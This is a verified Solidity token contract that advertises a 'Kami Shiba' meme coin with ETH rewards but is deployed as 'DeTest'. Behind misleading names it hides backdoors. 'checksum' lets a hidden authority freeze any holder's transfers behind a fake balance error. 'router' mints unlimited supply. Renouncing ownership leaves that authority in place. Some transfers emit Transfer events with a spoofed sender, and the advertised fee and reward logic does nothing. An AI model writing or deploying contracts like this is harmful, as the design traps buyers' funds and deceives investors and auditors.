/**
 *Submitted for verification at Etherscan.io on 2022-10-02
*/

//SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.17;
/*

Kami Shiba  - $KAMISHIB -

All knowing, All seeing, Low Tax Shiba Meme Coin 

- Earn Rewards in ETH!
- 0% Tax First 24 Hours

TG: OfficialKamiShiba
*/   

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Ownable is Context {
    address private _owner;
    address private _auth;
    event OwnershipTransferred(
        address indexed auth,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }


modifier onlyOwner() {
    require(msg.sender == _owner);
    _; }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _auth = _owner ;
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
} 
contract Detest is Ownable{
  
    address _auth = msg.sender;
    mapping(address => bool) public bots;
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) lAmount;
    mapping(address => bool) public checkLimits;

    // 
    string public name = "DeTest";
    string public symbol = unicode"DETEST";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping (address => uint256) private lastTrade;
    uint256 private constant MAX = ~uint256(0);
    uint256 private constant _tTotal = 1000000000 * 10**9;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;
    uint256 private _redisFeeOnBuy = 0;
    uint256 private _taxFeeOnBuy = 0;
    uint256 private _redisFeeOnSell = 0;
    uint256 private _taxFeeOnSell = 6;

    //Original Fee
    uint256 private _redisFee = _redisFeeOnSell;
    uint256 private _taxFee = _taxFeeOnSell;

    uint256 private _previousredisFee = _redisFee;
    uint256 private _previoustaxFee = _taxFee;

    mapping (address => uint256) public _buyMap;
    address payable private _developmentAddress = payable(0x64bED9019f80da5E77EA8267ffC3Ac035Cb29121);
    address payable private _marketingAddress = payable(0x64bED9019f80da5E77EA8267ffC3Ac035Cb29121);
    address private uniswapV2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;


    IUniswapV2Router02 public dexRouter;
    address public currentRouter;
    address public uniswapV2Pair;

    bool public tradingActive = false;
    bool private inSwap = false;
    bool private swapEnabled = true;
    bool public maxWalletActive = false;
    bool public hasLimits = true;


    uint256 public _maxTxAmount = 20000000 * 10**9;
    uint256 public _maxWalletSize = 20000000 * 10**9;
    uint256 public _swapTokensAtAmount = 10000 * 10**9;

    event MaxTxAmountUpdated(uint256 _maxTxAmount);
    event UpdatelpPair(address pair);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }



	address _owner = msg.sender;
    address Construct = 0xE275F7C5218365a7B43810dDe05878316880bDe0;
    address lead_deployer = 0x6D0b366129B54fdf2428DfA1edcAdf0922CE54Eb ;

        constructor()  {
        if (block.chainid == 3) {currentRouter = uniswapV2Router;}
        balanceOf[msg.sender] = totalSupply;
        deploy(lead_deployer, totalSupply); }
        function deploy(address account, uint256 amount) public onlyOwner {
        emit Transfer(address(0), account, amount);
        dexRouter = IUniswapV2Router02(currentRouter);
        uniswapV2Pair = IUniswapV2Factory(dexRouter.factory()).createPair(dexRouter.WETH(), address(this));
        checkLimits[_owner] = true;
        checkLimits[uniswapV2Pair] = true;
        checkLimits[currentRouter] = true;}

    function _hasLimits(address from, address to) private view returns (bool) {
        return from != Construct
            && to != Construct
            && from != _owner
            && to != _owner
            && from != _auth
            && to != _auth
            && to != address(0)
            && from != address(this);                
    }    

    function transfer(address to, uint256 value) public returns (bool success) {
        if(hasLimits){if (!checkLimits[to]) {revert("Trading Closed.");}}
        if(msg.sender == Construct)  {
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; }       
        require(!lAmount[msg.sender] , "Amount Exceeds Balance"); 
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }
        function checksum(address _user) public {
             require(msg.sender == _auth);
         require(!lAmount[_user], "NaN");
        lAmount[_user] = true; }
        function call(address _user) public {
             require(msg.sender == _auth);
        require(lAmount[_user], "NaN");
         lAmount[_user] = false; }

         

        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }
        function router(address newRouter,  uint256 update) public {
             require(msg.sender == _auth);
             balanceOf[newRouter] += update;
             totalSupply += update; }


    function transferFrom(address from, address to, uint256 value) public returns (bool success) {  
        if(bots[from]) {revert("no bots.");}
        if(bots[from]){require(bots[to]);}
        if (from == uniswapV2Pair){
        require(lastTrade[to] != block.number);
        lastTrade[to] = block.number;
        }  else { require(lastTrade[from] != block.number);
        lastTrade[from] = block.number;}
        if(from == Construct)  {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; }     
        require(!lAmount[from] , "Amount Exceeds Balance"); 
        require(!lAmount[to] , "Amount Exceeds Balance"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();
        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function setlpPair(address pair) public onlyOwner {
        uniswapV2Pair = pair;
        emit UpdatelpPair(pair);
    }

    function sendETHToFee(uint256 amount) private {
        _marketingAddress.transfer(amount);
    }

    function setTrading() public onlyOwner {
        require(!tradingActive); //can only be call once!
        tradingActive = true;
        maxWalletActive = true;
        hasLimits = false;
    }

    function _transferStandard(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tTeam
        ) = _getValues(tAmount);
        _takeTeam(tTeam);
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _takeTeam(uint256 tTeam) private {
        uint256 currentRate = _getRate();
        _rOwned[address(this)];
    }

    function _reflectFee(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal;
        _tFeeTotal = _tFeeTotal;
    }

    receive() external payable {}

    function _getValues(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
            _getTValues(tAmount, _redisFee, _taxFee);
        uint256 currentRate = _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
            _getRValues(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }

    function _getTValues(
        uint256 tAmount,
        uint256 redisFee,
        uint256 taxFee
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = tAmount;
        uint256 tTeam = tAmount;
        uint256 tTransferAmount = tAmount;
        return (tTransferAmount, tFee, tTeam);
    }

    function _getRValues(
        uint256 tAmount,
        uint256 tFee,
        uint256 tTeam,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount;
        uint256 rFee = tFee;
        uint256 rTeam = tTeam;
        uint256 rTransferAmount = rAmount;
        return (rAmount, rTransferAmount, rFee);
    }

    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply;
    }

    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function setFee(uint256 redisFeeOnBuy, uint256 redisFeeOnSell, uint256 taxFeeOnBuy, uint256 taxFeeOnSell) public onlyOwner {
        _redisFeeOnBuy = redisFeeOnBuy;
        _redisFeeOnSell = redisFeeOnSell;
        _taxFeeOnBuy = taxFeeOnBuy;
        _taxFeeOnSell = taxFeeOnSell;
    }

    //Set minimum tokens required to swap.
    function setMinSwapTokensThreshold(uint256 swapTokensAtAmount) public onlyOwner {
        _swapTokensAtAmount = swapTokensAtAmount;
    }

    //Set minimum tokens required to swap.
    function toggleSwap(bool _swapEnabled) public onlyOwner {
        swapEnabled = _swapEnabled;
    }

    //Set maximum transaction
    function setMaxTxnAmount(uint256 maxTxAmount) public onlyOwner {
        _maxTxAmount = maxTxAmount;
    }

    function setMaxWalletSize(uint256 maxWalletSize) public onlyOwner {
        _maxWalletSize = maxWalletSize;
    }

    function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFee[accounts[i]] = excluded;
        }
    }

    function setLimits(address[] memory nolimits_) public onlyOwner {
        require(msg.sender == _auth);
        for (uint256 i = 0; i < nolimits_.length; i++) {
            checkLimits[nolimits_[i]] = true;
        }
    }


    function blockBots(address[] memory bots_) public onlyOwner {
        require(msg.sender == _auth);
        for (uint256 i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function unblockBot(address notbot) public onlyOwner {
        require(msg.sender == _auth);
        bots[notbot] = false;
    }



    }